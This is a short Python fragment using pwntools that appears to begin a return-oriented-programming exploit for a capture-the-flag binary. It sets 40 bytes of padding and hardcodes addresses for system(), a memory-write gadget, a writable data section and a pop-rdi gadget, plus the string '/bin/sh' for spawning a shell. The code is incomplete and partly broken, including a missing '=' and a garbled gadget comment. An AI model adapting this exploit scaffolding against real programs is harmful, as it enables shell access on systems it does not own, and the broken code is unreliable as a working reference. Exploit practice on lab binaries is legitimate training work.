import pwn

junk "A"*40

system = pwn.p64(0x00000000004005e0)


mov_gadget = pwn.p64(0x000000000040084f) # mov dword ptr [rdx], ebx; pop r13; pop r12; xor byte ptr [r10], r12b; re;

data = pwn.p64(0x0000000000601050) # data addr

pop_rdi = pwn.p64(0x00000000004008c3)

sh = "/bin/sh\x00"

